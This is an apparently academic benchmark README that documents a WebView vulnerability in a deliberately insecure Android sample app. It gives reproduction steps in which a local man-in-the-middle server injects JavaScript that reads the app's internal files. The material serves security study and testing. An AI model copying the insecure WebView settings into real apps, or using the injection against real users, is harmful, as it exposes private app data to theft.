# Summary
Apps that allow Javascript code to execute in a WebView without verifying where the JavaScript is coming from, can expose the app's resources.

# Android versions affected
Tested on Android 4.4 - Android 7.1

# Description of vulnerability and corresponding exploit
An Android app can display web pages by loading HTML/JavaScript files in a *WebView*. The loaded
HTML/JavaScript file runs in the context of the app i.e. it has access to the same resources and has the
same permissions the app has. For example, an HTML file loaded into the app from a server will have access
to the app's internal file system because the HTML file loaded from the server runs in the context of
the app.


*Issue:* An application can inject and execute malicious JavaScript inside the WebView (provided the WebView allows JavaScript execution).
If the WebView has access to the the app's internal resources or has permission to perform privileged operations then the malicious JavaScript
inside the WebView, will also have the same ability.

*Example:* The vulnerability is demonstrated by *Benign*. The
*MainActivity* of this app has a WebView which loads an HTML file from an internal file system.
The WebView uses *WebSetting.setJavaScriptEnable(true)* to enable JavaScript to execute in its context and uses *WebSetting.setAllowFileAccessFromFileURLs(true)*
to enable URLs with file scheme to access files in the app's internal file system. Note that this is secure because the web page is loaded from a file in the
internal file-system. However, the web page includes a JavaScript source from an Http server which gets loaded into the WebView when the file URL is loaded.
The JavaScript source will execute in the same context as that of the file URL which means that the JavaScript will execute in the context of the WebView
and because of *WebSetting.setJavaScriptEnable(true)* and *WebSetting.setAllowFileAccessFromFileURLs(true)* it will be able to access files in the internal
file system. *Misc/LocalServer* acts as man-in-the-middle that injects *Misc/LocalServer/templates/myScript.js* into the WebView. When the *uploadFile()* method in *myScript.js* executes, it reads sensitive data from the internal file-system.


# Steps to build the sample apps and to exploit the vulnerability

1. Setup a local Web Server. We have used Flask here. If you want to use Flask follow the instructions [here](https://bitbucket.org/secure-it-i/android-app-vulnerability-benchmarks/src/76cc87180f064b328c37cc57b5c743dba378a5de/Misc/LocalServer/README.md?at=master&fileviewer=file-view-default).

2. List targets:

    `$ android list targets`

3. List available Android Virtual Devices:

    `$ android list avd`

4. Create an emulator:

    `$ android create avd -n <name> -t <target>`

    *<target>* is obtained from the command listed in 1. *<name>* is the name you choose to give to the avd.

5. Start emulator:

    `$ emulator -avd <avd_name>`

    *<avd-name>* is obtained from the command listed in 3.

6. Edit the *url* field in *Benign/.../res/values/strings.xml* to reflect the url of the web server where the html file being loaded is stored.


7. Edit *demo1.html* to add the URL to the JavaScript file in your local web server:

    <script src="ipAddr-of-LocalServer:5000/js/"></script>


8. In *Benign/MyWebViewClient.java* edit the *onPagefinished()* method by adding the following line:

    `wv.loadUrl("javascript:uploadFile()");`

9. Build and install *Benign*:

    `$ cd Benign`

    Make sure there is a file called local.properties with an entry sdk=/path/to/Android/sdk.

    `$ ./gradlew installDebug`

10. Save *demo1.html* in the app's internal file system:

        `$ adb root`

        `$ adb push demo1.html /data/data/edu.ksu.cs.benign/files/demo1.html`

11. Create a file called *File2* in the app's internal storage

    `$ adb shell run-as "edu.ksu.cs.benign"`  

    `$ cd files`

    `$ echo "test data" >> File2`

    `$ exit`

12. Launch *Benign*.

13. The WebView should display the contents of *File2* thus demonstrating that *myScripts.js* has access to the internal file-system of the app.
